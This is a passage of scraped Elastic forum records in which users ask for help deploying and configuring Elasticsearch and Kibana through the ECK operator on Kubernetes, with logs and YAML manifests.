    "date": "February 6, 2020, 2:40pm February 6, 2020, 2:56pm February 7, 2020, 1:39pm",
    "body": "Hi all! I'm trying to deploy the ECK following the quick start document. Running the Step 1: Install custom resource definitions and the operator with its RBAC rules: However, the logging show me that it fails to get API group resources and unable to crate controller manager: {\"level\":\"info\",\"@timestamp\":\"2020-02-06T14:35:06.976Z\",\"logger\":\"manager\",\"message\":\"Operator configured to manage all namespaces\",\"ver\":\"1.0.0-6881438d\"} {\"level\":\"error\",\"@timestamp\":\"2020-02-06T14:35:36.977Z\",\"logger\":\"controller-runtime.manager\",\"message\":\"Failed to get API Group-Resources\",\"ver\":\"1.0.0-6881438d\",\"error\":\"Get https://10.80.0.1:443/api?timeout=32s: dial tcp 10.80.0.1:443: i/o timeout\",\"stacktrace\":\"github.com/go-logr/zapr.(*zapLogger).Error\\n\\t/go/pkg/mod/github.com/go-logr/zapr@v0.1.0/zapr.go:128\\nsigs.k8s.io/controller-runtime/pkg/manager.New\\n\\t/go/pkg/mod/sigs.k8s.io/controller-runtime@v0.4.0/pkg/manager/manager.go:238\\ngithub.com/elastic/cloud-on-k8s/cmd/manager.execute\\n\\t/go/src/github.com/elastic/cloud-on-k8s/cmd/manager/main.go:248\\ngithub.com/elastic/cloud-on-k8s/cmd/manager.glob..func1\\n\\t/go/src/github.com/elastic/cloud-on-k8s/cmd/manager/main.go:84\\ngithub.com/spf13/cobra.(*Command).execute\\n\\t/go/pkg/mod/github.com/spf13/cobra@v0.0.5/command.go:830\\ngithub.com/spf13/cobra.(*Command).ExecuteC\\n\\t/go/pkg/mod/github.com/spf13/cobra@v0.0.5/command.go:914\\ngithub.com/spf13/cobra.(*Command).Execute\\n\\t/go/pkg/mod/github.com/spf13/cobra@v0.0.5/command.go:864\\nmain.main\\n\\t/go/src/github.com/elastic/cloud-on-k8s/cmd/main.go:27\\nruntime.main\\n\\t/usr/local/go/src/runtime/proc.go:203\"} {\"level\":\"error\",\"@timestamp\":\"2020-02-06T14:35:36.977Z\",\"logger\":\"manager\",\"message\":\"unable to create controller manager\",\"ver\":\"1.0.0-6881438d\",\"error\":\"Get https://10.80.0.1:443/api?timeout=32s: dial tcp 10.80.0.1:443: i/o timeout\",\"stacktrace\":\"github.com/go-logr/zapr.(*zapLogger).Error\\n\\t/go/pkg/mod/github.com/go-logr/zapr@v0.1.0/zapr.go:128\\ngithub.com/elastic/cloud-on-k8s/cmd/manager.execute\\n\\t/go/src/github.com/elastic/cloud-on-k8s/cmd/manager/main.go:250\\ngithub.com/elastic/cloud-on-k8s/cmd/manager.glob..func1\\n\\t/go/src/github.com/elastic/cloud-on-k8s/cmd/manager/main.go:84\\ngithub.com/spf13/cobra.(*Command).execute\\n\\t/go/pkg/mod/github.com/spf13/cobra@v0.0.5/command.go:830\\ngithub.com/spf13/cobra.(*Command).ExecuteC\\n\\t/go/pkg/mod/github.com/spf13/cobra@v0.0.5/command.go:914\\ngithub.com/spf13/cobra.(*Command).Execute\\n\\t/go/pkg/mod/github.com/spf13/cobra@v0.0.5/command.go:864\\nmain.main\\n\\t/go/src/github.com/elastic/cloud-on-k8s/cmd/main.go:27\\nruntime.main\\n\\t/usr/local/go/src/runtime/proc.go:203\"} Any ideas?",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "deb5854d-48d0-48d7-afca-263c7b901000",
    "url": "https://discuss.elastic.co/t/custom-kibana-settings-in-eck/202006",
    "title": "Custom kibana settings in ECK",
    "category": [
      "Elastic Cloud on Kubernetes (ECK)"
    ],
    "author": "Mike_Eklund",
    "date": "October 2, 2019, 4:31pm October 2, 2019, 7:57pm October 2, 2019, 10:06pm February 5, 2020, 10:58am February 5, 2020, 12:59pm February 5, 2020, 1:47pm February 5, 2020, 2:09pm February 5, 2020, 2:40pm",
    "body": "It appears that you have to do manual configuration of ES if you want to change items in the kibana.yml such as elasticsearch.requestHeadersWhitelist? is this correct and we cant use elasticsearchRef to do all the username and cert stuff for us?",
    "website_area": "discuss",
    "replies": 8
  },
  {
    "id": "14bafaf9-1af8-436f-a4fb-c4580bc4f603",
    "url": "https://discuss.elastic.co/t/how-to-make-changes-in-config-elasticsearch-yml-from-elasticsearch-operator/217840",
    "title": "How to make changes in config elasticsearch.yml from elasticsearch operator",
    "category": [
      "Elastic Cloud on Kubernetes (ECK)"
    ],
    "author": "viveknagar",
    "date": "February 4, 2020, 3:11pm February 4, 2020, 3:46pm February 5, 2020, 8:40am",
    "body": "Hello , I want to make changes in /usr/share/elasticsearch/config/elasticsearch.yml from elasticsearch operator. I am using docker.elastic.co/eck/eck-operator:1.0.0 image of operator . And I have deployed elasticsearch from below yml apiVersion: elasticsearch.k8s.elastic.co/v1 kind: Elasticsearch metadata: name: quickstart spec: version: 7.5.2 nodeSets: name: default count: 1 podTemplate: spec: containers: - name: elasticsearch env: - name: ELASTIC_PASSWORD value: \"elastic\" config: node.master: true node.data: true node.ingest: true node.store.allow_mmap: false volumeClaimTemplates: metadata: name: elasticsearch-data spec: storageClassName: do-block-storage accessModes: ReadWriteOnce resources: requests: storage: 10Gi Can anyone help me for this",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "bccb5523-77d6-4693-a7a8-76933ff96e5d",
    "url": "https://discuss.elastic.co/t/eck-kubernetes-liveness-and-readiness-probes/217663",
    "title": "ECK - Kubernetes liveness and readiness probes",
    "category": [
      "Elastic Cloud on Kubernetes (ECK)"
    ],
    "author": "JanKowalik",
    "date": "February 3, 2020, 5:01pm February 4, 2020, 8:16am",
    "body": "Is it recommended to provide custom livenessProbe and readinessProbe for services deployed using the ECK operator? I can see that the operator creates readiness probes by default. Is the default suitable for production environment? What about a liveness probe, should I define one? How do I do it?",
    "website_area": "discuss",
    "replies": 2
  },
  {
    "id": "c2ecbb11-1efb-4bd9-8bf9-aebb8749eea9",
    "url": "https://discuss.elastic.co/t/possible-problem-with-elasticsearch-readinessprobe/217094",
    "title": "Possible problem with Elasticsearch readinessProbe?",
    "category": [
      "Elastic Cloud on Kubernetes (ECK)"
    ],
    "author": "tadgh",
    "date": "January 30, 2020, 2:31am January 30, 2020, 3:28am January 30, 2020, 11:20pm January 31, 2020, 4:33pm",
    "body": "Hey all, I am trying to setup a google cloud Ingress object to route traffic to the Elasticsearch service in ECK, but it appears as though the Ingress object attempts the health check using the HTTP protocol, instead of HTTPS. I was under the impression that the readinessProbe defined in the operator overrode the default check at / looking for 200 Here is my toy ES Config: apiVersion: elasticsearch.k8s.elastic.co/v1 kind: Elasticsearch metadata: name: quickstart spec: http: service: spec: type: LoadBalancer version: 7.5.2 nodeSets: - name: default count: 1 config: node.master: true node.data: true node.ingest: true node.store.allow_mmap: false Here is the accompanying ingress resource: apiVersion: extensions/v1beta1 kind: Ingress metadata: name: elastic-ingress annotations: kubernetes.io/ingress.global-static-ip-name: name-of-my-address kubernetes.io/ingress.allow-http: \"true\" spec: rules: - http: paths: - path: /* backend: serviceName: quickstart-es-http servicePort: 9200 A few minutes after I start this ingress, I get the following in the cloud console: 2020-01-29_18-291054×584 46.4 KB And in my elasticsearch pod logs, I get the following warnings, which seem to indicate that the health checks are being rejected: {\"type\": \"server\", \"timestamp\": \"2020-01-30T02:29:14,832Z\", \"level\": \"WARN\", \"component\": \"o.e.x.s.t.n.SecurityNetty4HttpServerTransport\", \"cluster.name\": \"quickstart\", \"node.name\": \"quickstart-es-default-0\", \"message\": \"received plaintext http traffic on an https channel, closing connection Netty4HttpChannel{localAddress=/10.16.0.23:9200, remoteAddress=/10.128.0.3:36878}\", \"cluster.uuid\": \"Oxno1fnRTluho2wlekONMA\", \"node.id\": \"DtOKi0UcS6K8NyAwDtsryA\" } Is there some simple way to resolve this? Cheers",
    "website_area": "discuss",
    "replies": 4
  },
  {
    "id": "6936c5ef-97ca-4fd3-8670-17f3033798f3",
    "url": "https://discuss.elastic.co/t/tuning-refresh-interval-for-eck-cluster/217291",
    "title": "Tuning refresh interval for eck cluster",
    "category": [
      "Elastic Cloud on Kubernetes (ECK)"
    ],
    "author": "dineshabbi",
    "date": "January 31, 2020, 3:57am January 31, 2020, 7:34am",
    "body": "How can I configure certain cluster/index settings from elasticsearch.yaml ? Say if I want to tune index.refresh_interval ? Whats the default value used by the eck ?",
    "website_area": "discuss",
    "replies": 2
  },
  {
    "id": "e8ec9be0-f78d-406b-ab2b-15d1ed947150",
    "url": "https://discuss.elastic.co/t/horizontal-and-vertical-upgrade-of-eck-cluster/210309",
    "title": "Horizontal and vertical upgrade of eck cluster",
    "category": [
      "Elastic Cloud on Kubernetes (ECK)"
    ],
    "author": "dineshabbi",
    "date": "December 3, 2019, 8:50am December 3, 2019, 9:08am January 31, 2020, 3:46am",
    "body": "As per the documentation, I tried doing upgrades of the cluster using some of the examples given in https://www.elastic.co/guide/en/cloud-on-k8s/current/k8s-orchestration.html a) Horizontal upgrade: I see a new service getting created with every statefulset creation, but under the hood they all belong to one cluster and is accessible via http service 9200 right ? How can I confirm that the shards are being rebalanced after horizontal upgrade ? ❯ kubectl get svc -n elastic-system ✹ ✭ NAME TYPE CLUSTER-IP EXTERNAL-IP PORT(S) AGE elasticsearch-exporter ClusterIP 172.20.72.204 9108/TCP 6d1h elasticsearch-sample-es-data-nodes ClusterIP None 5d20h elasticsearch-sample-es-data-nodes-2 ClusterIP None 41h elasticsearch-sample-es-http ClusterIP 172.20.133.254 9200/TCP 5d20h kibana-sample-kb-http ClusterIP 172.20.94.101 5601/TCP 5d20h b) Vertical upgrade I tried, but I did specify a wrong RAM size while specifying, and the cluster got into a state where it could not recover/add any new pods after that. I am using 1.0 beta version, and I wonder vertical upgrade is fully supported in this release. create Pod elasticsearch-sample-es-data-nodes-2-0 in StatefulSet elasticsearch-sample-es-data-nodes-2 failed error: Pod \"elasticsearch-sample-es-data-nodes-2-0\" is invalid: spec.containers[0].resources.requests: Invalid value: \"3Gi\": must be less than or equal to memory limit",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "af70c7cc-983b-49c1-b403-61a87042e7f5",
    "url": "https://discuss.elastic.co/t/unable-to-log-in-elastic-using-the-non-default-users-username-and-password/216937",
    "title": "Unable to log in elastic using the non-default user's username and password",
    "category": [
      "Elastic Cloud on Kubernetes (ECK)"
    ],
    "author": "pingz",
    "date": "January 29, 2020, 3:15am January 29, 2020, 7:08pm January 30, 2020, 8:56am January 30, 2020, 10:27pm",
    "body": "I was able to successfully create a user 'test1' and assign it the superuser role. Execute rest api POST /_security/user/test1?pretty { \"password\" : \"test@1\", \"roles\" : [ \"superuser\"], \"full_name\" : \"Test User\", \"email\" : \"testuser@example.com\", \"metadata\" : { \"intelligence\" : 7 } } The user is successfully created { \"created\" : true } But when I tried to invoke elastic api using the newly created user 'test1', I got the following error curl -u test1:test@1 https://es.endpoint {\"error\":{\"root_cause\":[{\"type\":\"security_exception\",\"reason\":\"unable to authenticate user [test1] for REST request [/]\",\"header\":{\"WWW-Authenticate\":\"Basic realm=\"security\" charset=\"UTF-8\"\"}}],\"type\":\"security_exception\",\"reason\":\"unable to authenticate user [test1] for REST request [/]\",\"header\":{\"WWW-Authenticate\":\"Basic realm=\"security\" charset=\"UTF-8\"\"}},\"status\":401} My elastic stack was set up using the following configuration. The default elastic user works fine. Any idea why test1 does not work? apiVersion: elasticsearch.k8s.elastic.co/v1 kind: Elasticsearch metadata: name: quickstart namespace: log-server spec: version: 7.5.1 http: tls: selfSignedCertificate: disabled: true nodeSets: name: default count: 3 config: xpack.security.authc: anonymous: username: anonymous roles: superuser authz_exception: false",
    "website_area": "discuss",
    "replies": 4
  },
  {
    "id": "55ff601a-cbee-43e2-934a-d28838f3c41b",
    "url": "https://discuss.elastic.co/t/does-elastic-have-a-healthcheck-endpoint-that-does-not-require-username-and-password/217090",
    "title": "Does elastic have a healthcheck endpoint that does not require username and password",
    "category": [
      "Elastic Cloud on Kubernetes (ECK)"
    ],
    "author": "pingz",
    "date": "January 30, 2020, 1:25am January 30, 2020, 9:25am January 30, 2020, 9:35am January 30, 2020, 4:13pm January 30, 2020, 6:33pm",
    "body": "Problem description: AWS ALB health check does not take in username and password. For elastic search container to attach to ALB and pass its health check, I have to enable the anonymous user in elastic and assign it the superuser role. xpack.security.authc: anonymous: username: anonymous roles: superuser authz_exception: false The problem is that anonymous user role is also inherited by other created users later, so the user role does not work. Any user created, although they are assigned with specific role, they all seem to have superuser role permission. I would like to disable the anonymous user, but also would like to know if there is a way to perform a health check without providing username and password to health check endpoint",
    "website_area": "discuss",
    "replies": 5
  },
  {
    "id": "e5693ac4-03bc-4cff-845d-cc2c460c8dd4",
    "url": "https://discuss.elastic.co/t/run-elastic-operator-with-fewer-permissions-disable-webhook/217135",
    "title": "Run elastic-operator with fewer permissions? Disable webhook?",
    "category": [
      "Elastic Cloud on Kubernetes (ECK)"
    ],
    "author": "CoaxVex",
    "date": "January 30, 2020, 9:02am January 30, 2020, 9:31am",
    "body": "The elastic-operator ClusterRole, which is deployed and granted when installing with the \"all-in-one.yaml\" method gives a lot of permissions on the cluster. So much even, you may as well be running the operator as cluster-admin. Is there a supported deployment method which allows the operator to run so that it can only watch / manage objects in specific namespaces? Can we also go without permissions to manage admission configurations? (ie: disable the webhook?) I do not feel comfortable sending all my secrets to the operator for inspection, and it makes the uninstalls more complex...",
    "website_area": "discuss",
    "replies": 2
  },
  {
    "id": "9fe180c8-7964-41d1-8dac-abb98ff60d77",
    "url": "https://discuss.elastic.co/t/elasticsearch-state-invalid-after-trying-to-install-plugin/216296",
    "title": "Elasticsearch state \"Invalid\" after trying to install plugin",
    "category": [
      "Elastic Cloud on Kubernetes (ECK)"
    ],
    "author": "radw",
    "date": "January 23, 2020, 4:51pm January 23, 2020, 5:31pm January 27, 2020, 12:33pm",
    "body": "Hi folks! I did an ECK installation on GKE with v1beta1. After 1 month I've resized the PVs to accomodate the new storage needs. Everything went smooth and the PVs resized correctly and are shown in the monitoring section of Kibana with the correct value. A few days ago I've been tasked to backup the indices to GCS so for that I needed to install the repository-gcs plugin. I've followed the guide on elastic.co but seems like something went wrong and now when I call kubectl get elasticsearch the output says PHASE Invalid Whatever I tried to do to restore it's health it's useless. I have 3 master nodes so I tried to bring down 1 master node to see if the new pod will spin up correctly but, unfortunately, the pod is spinned up but doesn't join the cluster. My configuration is as follows: Name: siem-test Namespace: default Labels: Annotations: common.k8s.elastic.co/controller-version: 0.0.0-UNKNOWN kubectl.kubernetes.io/last-applied-configuration: {\"apiVersion\":\"elasticsearch.k8s.elastic.co/v1beta1\",\"kind\":\"Elasticsearch\",\"metadata\":{\"annotations\":{},\"name\":\"siem-test\",\"namespace\":... API Version: elasticsearch.k8s.elastic.co/v1beta1 Kind: Elasticsearch Metadata: Creation Timestamp: 2019-10-25T08:44:03Z Generation: 23 Resource Version: 27989855 Self Link: /apis/elasticsearch.k8s.elastic.co/v1beta1/namespaces/default/elasticsearches/siem-test UID: 98f623e5-f703-11e9-903e-42010a8401ee Spec: Http: Service: Metadata: Creation Timestamp: Spec: Ports: Port: 9200 Target Port: 9200 Type: LoadBalancer Tls: Certificate: Node Sets: Config: Node . Data: false Node . Ingest: false Node . Master: true Node . Ml: false Node . Store . Allow Mmap: false Xpack . Security . Authc . Realms: Native: Native 1: Order: 1 Count: 3 Name: node-master Pod Template: Metadata: Labels: Es: master-node Spec: Containers: Env: Name: ES_JAVA_OPTS Value: -Xms2g -Xmx2g Name: elasticsearch Resources: Limits: Cpu: 1 Memory: 4Gi Init Containers: Command: sh -c bin/elasticsearch-plugin install --batch repository-gcs Name: install-plugins Volume Claim Templates: Metadata: Name: elasticsearch-data Spec: Access Modes: ReadWriteOnce Resources: Requests: Storage: 10Gi Storage Class Name: ssd Config: Node . Data: true Node . Ingest: true Node . Master: false Node . Ml: true Node . Store . Allow Mmap: false Xpack . Security . Authc . Realms: Native: Native 1: Order: 1 Count: 5 Name: node-data Pod Template: Metadata: Labels: Es: data-node Spec: Containers: Env: Name: ES_JAVA_OPTS Value: -Xms2g -Xmx2g Name: elasticsearch Resources: Limits: Cpu: 2 Memory: 4Gi Init Containers: Command: sh -c bin/elasticsearch-plugin install --batch repository-gcs Name: install-plugins Volume Claim Templates: Metadata: Name: elasticsearch-data Spec: Access Modes: ReadWriteOnce Resources: Requests: Storage: 200Gi Storage Class Name: ssd Secure Settings: Secret Name: gcs-credentials Update Strategy: Change Budget: Version: 7.4.0 Status: Available Nodes: 7 Health: green Phase: Invalid Events: I don't want to lose any of the data already stored on the nodes. I have even manually installed the repository-gcs plugin on each pod but as I have to restart the elasticsearch service, it is not recognised in the Kibana interface so I can backup the indices and redo the whole cluster. Any thoughts on how can I narrow down this problem and try to solve it? Any help is highly appreciated! Radu",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "9ef913bb-5f77-464b-94d3-7879f7470604",
    "url": "https://discuss.elastic.co/t/is-there-a-prefered-way-to-configure-default-number-of-replicas-on-eck/216553",
    "title": "Is there a prefered way to configure default number_of_replicas on ECK?",
    "category": [
      "Elastic Cloud on Kubernetes (ECK)"
    ],
    "author": "vroad",
    "date": "January 26, 2020, 1:59am February 23, 2020, 1:57am",
    "body": "Just setting node count to 3 does not change number_of_replicas value for newly created indices. I'm wondering if there is a way to configure index template using CRD, so that I can change this value easily when creating a new cluster. I could not find any article mentioning setting index template values on ECK. Quick start article has an example with 3 nodes, but doesn't mention anything about adjusting number of replicas values at all. Why? Nobody wants to increase number of nodes without creating replicas on each node, I guess. https://www.elastic.co/guide/en/cloud-on-k8s/current/k8s-quickstart.html#k8s-upgrade-deployment",
    "website_area": "discuss",
    "replies": 2
  },
  {
    "id": "0a16b50f-c7f4-4bb9-b566-d92fb4cb313a",
    "url": "https://discuss.elastic.co/t/picking-up-a-configuration-file-change/214219",
    "title": "Picking up a configuration file change",
    "category": [
      "Elastic Cloud on Kubernetes (ECK)"
    ],
    "author": "JanKowalik",
    "date": "January 8, 2020, 11:37am January 8, 2020, 12:00pm January 8, 2020, 2:42pm January 8, 2020, 3:35pm January 8, 2020, 3:48pm January 8, 2020, 4:17pm January 8, 2020, 5:10pm January 9, 2020, 11:08am January 9, 2020, 11:08am January 9, 2020, 11:36am January 9, 2020, 1:11pm January 9, 2020, 3:03pm January 9, 2020, 3:10pm January 9, 2020, 3:31pm January 9, 2020, 3:39pm January 9, 2020, 3:43pm January 10, 2020, 1:46pm January 10, 2020, 2:10pm January 10, 2020, 3:54pm January 13, 2020, 3:50pm",
    "body": "Hi, It seems that ECK does not pickup configuration changes. How do I make it pick it up? Do I restart the nodes? How can I do it via ECK? Thanks",
    "website_area": "discuss",
    "replies": 21
  },
  {
    "id": "66ea2349-73ae-4846-952c-3f8a151ee3f3",
    "url": "https://discuss.elastic.co/t/active-remote-cluster-in-eck/216287",
    "title": "Active remote cluster in ECK",
    "category": [
      "Elastic Cloud on Kubernetes (ECK)"
    ],
    "author": "Jdompablo",
    "date": "January 23, 2020, 3:55pm January 24, 2020, 9:27am January 24, 2020, 10:30am",
    "body": "I am trying to add a remote cluster within a kibana deployed in kubernetes, but it asks me to enter the seed of the remote node. From what I see port 9300 is not exposed. How can this communication be done?",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "7912e1ad-bfed-4c6c-9277-09575cca920c",
    "url": "https://discuss.elastic.co/t/what-ver-of-elastic-is-able-to-be-run-in-eck/215917",
    "title": "What Ver of Elastic is able to be run in ECK?",
    "category": [
      "Elastic Cloud on Kubernetes (ECK)"
    ],
    "author": "bigdamhero",
    "date": "January 21, 2020, 4:27pm January 21, 2020, 5:09pm January 21, 2020, 5:20pm January 21, 2020, 5:41pm January 21, 2020, 5:44pm January 21, 2020, 7:54pm January 21, 2020, 8:38pm",
    "body": "We are trying to upgrade our docker container based clusters into the newly released ECK. I am not seeing what newest version of ECK and support running. We want to try to migrate as much as we can and I am just wondering if there is a limitation on what we should upgrade and when. Thank you.",
    "website_area": "discuss",
    "replies": 7
  },
  {
    "id": "738e7b04-4c31-427d-b0a5-d9fe36e697d9",
    "url": "https://discuss.elastic.co/t/best-option-for-persistent-volume-of-an-on-premise-eck/215611",
    "title": "Best option for persistent volume of an on-premise ECK",
    "category": [
      "Elastic Cloud on Kubernetes (ECK)"
    ],
    "author": "Ali_Reza_Haghighat",
    "date": "January 19, 2020, 9:50am January 21, 2020, 10:37am",
    "body": "We have a cluster with multiple elastic instances deployed on a few servers. We decided to use ECK to manage our cluster. We are looking for the best option for persistent volume for an ECK cluster. We have tried NFS and Local Volumes. However, NFS volume is not recommended to be used with Elasticsearch (here and here). We also have problems using Local volume (Pod crashes after a few document insertion). Could you please help us to choose best volume option for our case? We use Debian on our servers.",
    "website_area": "discuss",
    "replies": 2
  },
  {
    "id": "cbdf1769-62bb-43b7-ad1b-313d225be255",
    "url": "https://discuss.elastic.co/t/gke-upgrade-and-pdb/215661",
    "title": "GKE Upgrade and PDB",
    "category": [
      "Elastic Cloud on Kubernetes (ECK)"
    ],
    "author": "Vincent_Ngai",
    "date": "January 20, 2020, 2:44am January 20, 2020, 8:23am January 20, 2020, 8:51am January 20, 2020, 9:21am January 20, 2020, 9:20am January 20, 2020, 10:18am January 20, 2020, 10:48am January 20, 2020, 11:00am",
    "body": "Hey Guys, I am install my ECK on GKE as you may know GKE provide a method for cluster auto upgrade or no matter as a normal upgrade for node pool (it does 1 by 1 in each zone) if we setup PDB , it will follow the rules as max 1 hour However i dont know if 1 hour is enough for the replica relocate to another know What will happen to the case and do ECK correspond react for this ? https://cloud.google.com/kubernetes-engine/docs/how-to/upgrading-a-cluster",
    "website_area": "discuss",
    "replies": 8
  },
  {
    "id": "39bd9890-dbde-40f7-bed6-39ab441865cf",
    "url": "https://discuss.elastic.co/t/filebeat-to-eck-on-gke/215575",
    "title": "Filebeat to ECK on GKE",
    "category": [
      "Elastic Cloud on Kubernetes (ECK)"
    ],
    "author": "Zero_Day",
    "date": "January 18, 2020, 8:58pm January 20, 2020, 5:47am January 20, 2020, 7:43am January 20, 2020, 10:03am",
    "body": "I built a cluster on GKE with ECK operator and am trying to send logs from an on premises Filebeat installation to the cloud. Elasticsearch has LoadBlancer IP. I specified certificate, password and necessary things, but I couldn't make it work. Is there a tutorial?",
    "website_area": "discuss",
    "replies": 4
  },
  {
    "id": "66bc93de-e74f-4849-afaf-aea2eefb2d11",
    "url": "https://discuss.elastic.co/t/user-role-management-best-practices/187197",
    "title": "User/role management best practices",
    "category": [
      "Elastic Cloud on Kubernetes (ECK)"
    ],
    "author": "t0ffel",
    "date": "June 24, 2019, 8:55pm June 25, 2019, 7:24am January 15, 2020, 2:50pm January 18, 2020, 10:41am January 20, 2020, 9:28am",
    "body": "What is the best practice for the user and role management with the operator? Is it preferable to create users k8s resources or is it better to create users via Kibana? is there a way to do custom roles via k8s resources?",
    "website_area": "discuss",
    "replies": 5
  },
  {
    "id": "4b5bf78c-2f37-410b-bd84-f1ca8c55e4ed",
    "url": "https://discuss.elastic.co/t/eck-and-prometheus/215495",
    "title": "Eck and Prometheus",
    "category": [
      "Elastic Cloud on Kubernetes (ECK)"
    ],
    "author": "jdambly",
    "date": "January 17, 2020, 4:45pm",
    "body": "What using eck what is the best way to send metrics to Prometheus for monitoring? I see there are a couple of projects for this GitHub vvanholl/elasticsearch-prometheus-exporter Prometheus exporter plugin for ElasticSearch. Contribute to vvanholl/elasticsearch-prometheus-exporter development by creating an account on GitHub. And GitHub justwatchcom/elasticsearch_exporter Elasticsearch stats exporter for Prometheus. Contribute to justwatchcom/elasticsearch_exporter development by creating an account on GitHub. Are there any other that are better?",
    "website_area": "discuss",
    "replies": 1
  },
  {
    "id": "f089eab9-bf59-42a5-9752-c1b1808e5a87",
    "url": "https://discuss.elastic.co/t/elastic-stack-helm-charts/187598",
    "title": "Elastic Stack Helm Charts",
    "category": [
      "Elastic Cloud on Kubernetes (ECK)"
    ],
    "author": "LaurentGoderre",
    "date": "June 26, 2019, 2:48pm June 27, 2019, 3:27pm June 27, 2019, 5:20pm July 1, 2019, 8:29pm January 15, 2020, 5:31pm January 17, 2020, 3:29pm",
    "body": "I had started an epic to fix the elastic-stack helm chart in helm/stable: https://github.com/helm/charts/issues/14564 I think this work is still desirable because it should be easy to install the stack using helm without having to manually link the pods together. Is this something the community is interested in?",
    "website_area": "discuss",
    "replies": 6
  },
  {
    "id": "03154b53-1d68-4ea4-a161-0b5f8286bc8e",
    "url": "https://discuss.elastic.co/t/change-defauit-volume-size-for-elastic/215421",
    "title": "Change defauit volume size for elastic",
    "category": [
      "Elastic Cloud on Kubernetes (ECK)"
    ],
    "author": "KapitanPlaneta",
    "date": "January 17, 2020, 7:29am January 17, 2020, 8:01am January 17, 2020, 9:34am",
    "body": "Elasticsearch comes with a 1GB storage by default > NAME STATUS VOLUME CAPACITY ACCESS MODES STORAGECLASS AGE > elasticsearch-data-elasticsearch-es-default-0 Bound pvc-4d565cd7-3894-11ea-a77b-12b06dd324bb 1Gi RWO gp2 12 Is there a way to change the size without configuring my own pvc, volume and volume mount? thanks",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "a5a25350-99b1-4826-9eda-0939b0dceb53",
    "url": "https://discuss.elastic.co/t/setup-snapshot-for-s3-plugin/211661",
    "title": "Setup snapshot for s3 plugin",
    "category": [
      "Elastic Cloud on Kubernetes (ECK)"
    ],
    "author": "dg_hivebrite",
    "date": "December 12, 2019, 2:12pm December 12, 2019, 2:30pm December 12, 2019, 2:54pm December 13, 2019, 2:11pm December 13, 2019, 2:58pm December 17, 2019, 8:57am December 17, 2019, 9:18am December 17, 2019, 3:21pm December 19, 2019, 9:59am December 19, 2019, 12:04pm December 20, 2019, 8:49am December 20, 2019, 10:53am December 20, 2019, 2:44pm December 20, 2019, 3:15pm January 15, 2020, 5:27pm January 15, 2020, 5:51pm",
    "body": "Hi, I'm trying to setup the s3 plugin but I have an issue. I don't how to format the secret for aws credentials for the operator. Actually I tried that (with terraform): resource \"kubernetes_secret\" \"aws_credentials_datawarehouse\" { type = \"kubernetes.io/generic\" metadata { name = \"datawarehouse-aws-credentials\" } data = { \"s3.client.default.access_key\" = \".....\" \"s3.client.default.secret_key\" = \".....\" } } The operator log an error: E1212 13:40:26.641312 1 reflector.go:126] pkg/mod/k8s.io/client-go@v11.0.1-0.20190409021438-1a26190bd76a+incompatible/tools/cache/reflector.go:94: Failed to list *v1beta1.Elasticsearch: v1beta1.ElasticsearchList.Items: []v1beta1.Elasticsearch: v1beta1.Elasticsearch.Spec: v1beta1.ElasticsearchSpec.SecureSettings: []v1beta1.SecretSource: readObjectStart: expect { or n, but found \", error found in #10 byte of ...|ttings\":[\"datawareho|..., bigger context ...|rageClassName\":\"standard\"}}]}],\"secureSettings\":[\"datawarehouse-aws-credentials\"],\"updateStrategy\":{|... I tried to check in the github repository but I'm not sure of which format is expected inside the secret",
    "website_area": "discuss",
    "replies": 16
  },
  {
    "id": "35db2d5c-bda3-48bf-9833-8177a2b72923",
    "url": "https://discuss.elastic.co/t/deploy-eck-to-a-single-namespace/211495",
    "title": "Deploy ECK to a Single Namespace",
    "category": [
      "Elastic Cloud on Kubernetes (ECK)"
    ],
    "author": "nobound",
    "date": "December 11, 2019, 4:07pm December 11, 2019, 4:45pm December 11, 2019, 4:55pm December 12, 2019, 8:30pm December 12, 2019, 9:10pm December 12, 2019, 9:25pm January 8, 2020, 9:20pm January 10, 2020, 3:17pm",
    "body": "Hi, I would like to deploy ECK within a single namespace, but it is not clear to me how to do so after reading https://www.elastic.co/guide/en/cloud-on-k8s/current/k8s-ns-config.html and https://www.elastic.co/guide/en/cloud-on-k8s/current/k8s-operator-config.html. Not sure exactly how to specify thoes options. Can someone give me a quick example? Thanks Kc",
    "website_area": "discuss",
    "replies": 8
  },
  {
    "id": "2f74c457-9b43-4ce9-9880-ad7da7ecdaa5",
    "url": "https://discuss.elastic.co/t/how-to-configure-nfs-in-eck-k8s-rancher/213936",
    "title": "How to configure nfs in ECK k8s Rancher",
    "category": [
      "Elastic Cloud on Kubernetes (ECK)"
    ],
    "author": "Marinho_DevOPs",
    "date": "January 6, 2020, 8:53pm January 6, 2020, 10:46pm January 7, 2020, 8:31am January 7, 2020, 5:26pm January 8, 2020, 8:57am January 8, 2020, 10:43am January 8, 2020, 10:50am January 8, 2020, 10:55am January 8, 2020, 3:50pm January 8, 2020, 4:56pm January 10, 2020, 3:06pm",
    "body": "Hi I have a problem setting a volume in the all-in-one.yaml file. I am trying to map an ntfs to persist the external volume and not use the Elastic default. Could someone help me in this case. My file. apiVersion: apps/v1 kind: StatefulSet metadata: name: elastic-operator namespace: elasticsearch-funcional labels: control-plane: elastic-operator spec: selector: matchLabels: control-plane: elastic-operator serviceName: elastic-operator template: metadata: labels: control-plane: elastic-operator spec: serviceAccountName: elastic-operator containers: - image: docker.elastic.co/eck/eck-operator:1.0.0-beta1 volumeMounts: - name: elasticsearch-data mountPath: /usr/share/elasticsearch/data name: manager args: [\"manager\", \"--operator-roles\", \"all\", \"--enable-debug-logs=true\"] env: - name: OPERATOR_NAMESPACE valueFrom: fieldRef: fieldPath: metadata.namespace - name: WEBHOOK_SECRET value: webhook-server-secret - name: WEBHOOK_PODS_LABEL value: elastic-operator - name: OPERATOR_IMAGE value: docker.elastic.co/eck/eck-operator:1.0.0-beta1 resources: limits: cpu: 1 memory: 150Mi requests: cpu: 100m memory: 50Mi ports: - containerPort: 9876 name: webhook-server protocol: TCP terminationGracePeriodSeconds: 10 volumes: - name: elasticsearch-data nfs: server: 192.168.134.137 path: /nfs/dev/elastick8",
    "website_area": "discuss",
    "replies": 11
  },
  {
    "id": "ac0c8995-1aca-46f8-964e-8e56b051b87b",
    "url": "https://discuss.elastic.co/t/how-can-i-remove-the-es-default-service-installed-by-cloud-on-k8s/214358",
